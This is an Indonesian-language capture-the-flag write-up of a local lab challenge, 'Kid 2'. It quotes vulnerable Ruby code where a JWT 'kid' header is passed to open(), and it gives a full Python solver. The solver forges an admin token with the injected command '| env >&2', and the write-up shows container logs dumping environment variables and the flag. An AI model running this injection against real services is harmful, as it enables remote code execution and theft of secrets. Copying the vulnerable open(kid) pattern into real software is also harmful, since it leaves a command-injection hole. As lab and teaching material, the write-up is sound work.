# WriteUp - Kid 2

## Overview

* **Judul:** Kid 2
* **Kategori:** Input Injection
* **Poin:** 25
* **Deskripsi:** Bongkar rahasia admin.
* **URL:** `http://localhost:1337`

## Reconnaissance

### 1. Source Code Analysis

Dengan akses ke Docker, kita dapat menganalisis file `app.rb`. Ditemukan kerentanan pada endpoint `/dashboard` dalam cara aplikasi menangani parameter `kid` dari header JWT.

```ruby
# app.rb (vulnerable code)
decoded_token = JWT.decode(token, nil, false)
header = decoded_token[1]
kid = header['kid']

public_key_content = open(kid).read  # VULNERABILITY: Command Injection via open()
public_key = OpenSSL::PKey::RSA.new(public_key_content)

decoded = JWT.decode(token, public_key, true, { algorithm: 'RS256' })

```

Fungsi `open(kid)` di Ruby, jika diberikan string yang dimulai dengan karakter pipa `|`, akan mengeksekusi string tersebut sebagai perintah shell dan mengembalikan outputnya (*standard output*).

### 2. Dashboard Logic

Analisis file `views/dashboard.erb` menunjukkan bahwa flag tidak ditampilkan langsung di halaman admin, melainkan tersimpan di **Environment Variables**.

```erb
<% if @claims['role'] == 'admin' %>
    <h1>Admin Console</h1>
    <p>The flag is in the environment variables. You need RCE to get it.</p>

```

## Vulnerability Analysis

Aplikasi memiliki celah **Command Injection** melalui parameter `kid` di header JWT.
Server mengharapkan `kid` menunjuk ke file public key untuk memverifikasi token. Namun, karena input tidak divalidasi, kita dapat memanipulasinya untuk mengeksekusi perintah sistem.

Alur serangan:

1. Buat JWT dengan payload `role: admin`.
2. Set header `kid` dengan payload injeksi: `| [COMMAND]`.
3. Server mengeksekusi perintah tersebut. Outputnya (stdout) akan dianggap sebagai Public Key.
4. Jika kita membuat perintah yang outputnya adalah **Public Key kita sendiri**, server akan memverifikasi token kita menggunakan kunci tersebut. Karena kita menandatangani token dengan pasangan Private Key-nya, verifikasi berhasil.

## Exploitation

Tujuan eksploitasi adalah melakukan **Remote Code Execution (RCE)** untuk membaca environment variable `FLAG`.

Strategi:

1. Generate pasangan kunci RSA (Private & Public) lokal.
2. Buat token admin dan tanda tangani dengan Private Key lokal.
3. Inject header `kid` dengan perintah: `| env >&2`.
* Perintah `env` akan mencetak semua environment variables.
* `>&2` me-redirect output ke **Standard Error (stderr)** agar muncul di log Docker, karena output standar (stdout) akan diproses oleh `OpenSSL` (dan pasti gagal karena format output `env` bukan format kunci PEM yang valid).



### Script Solver (`exploit.py`)

```python
import requests
import jwt
import time
import subprocess
import os

TARGET_URL = "http://localhost:1337"
DASHBOARD_URL = f"{TARGET_URL}/dashboard"

def generate_keypair():
    # Generate temporary RSA keys locally
    subprocess.check_call("openssl genrsa -out evil_priv.pem 2048", shell=True, stderr=subprocess.DEVNULL)
    with open("evil_priv.pem", "rb") as f:
        priv = f.read()
    return priv

def exploit():
    try:
        private_key_pem = generate_keypair()
    except:
        print("[-] OpenSSL required.")
        return

    # Payload Injection: Execute 'env' and redirect to stderr
    injection_payload = "| env >&2"
    
    print(f"[*] Injection Payload: {injection_payload}")

    # Create Forged Admin Token
    payload = {
        "username": "admin",
        "role": "admin",
        "exp": int(time.time()) + 3600
    }
    
    headers = {
        "kid": injection_payload
    }
    
    print("[*] Signing token & Launching RCE...")
    forged_token = jwt.encode(
        payload, 
        private_key_pem, 
        algorithm="RS256", 
        headers=headers
    )
    
    cookies = {"token": forged_token}
    
    # Send Request to trigger RCE
    try:
        requests.get(DASHBOARD_URL, cookies=cookies, timeout=5)
    except:
        pass
    
    print("\n[+] Payload sent! Check docker logs for the flag.")

    # Cleanup
    if os.path.exists("evil_priv.pem"):
        os.remove("evil_priv.pem")

if __name__ == "__main__":
    exploit()

```

### Terminal Output

Menjalankan exploit:

```bash
$ ./exploit.py
[*] Injection Payload: | env >&2
[*] Signing token & Launching RCE...

[+] Payload sent! Sekarang cek log docker lu:
    Command: docker logs kid2-web-1
    Cari baris yang ada 'FLAG=' atau 'pwn{'

```

Memeriksa log container untuk melihat hasil eksekusi perintah `env`:

```bash
$ docker logs kid2-web-1
== Sinatra (v4.2.1) has taken the stage on 80 for development with backup from Puma
...
172.30.0.1 - - [04/Feb/2026:13:19:36 +0000] "GET /dashboard HTTP/1.1" 200 3264 0.2173
BUNDLER_VERSION=2.4.19
HOSTNAME=a5868c39cb80
PWN=WanZKey
SHLVL=2
RUBYOPT=-r/usr/local/lib/ruby/3.2.0/bundler/setup
HOME=/root
...
FLAG=pwn{83ce3c89b09a93204476ad6b62f7b5ba}
BUNDLER_ORIG_RUBYLIB=BUNDLER_ENVIRONMENT_PRESERVER_INTENTIONALLY_NIL
Error: Neither PUB key nor PRIV key: unsupported
172.30.0.1 - - [04/Feb/2026:13:23:22 +0000] "GET /dashboard HTTP/1.1" 302 - 0.0166

```

## Flag

```
pwn{83ce3c89b09a93204476ad6b62f7b5ba}

```
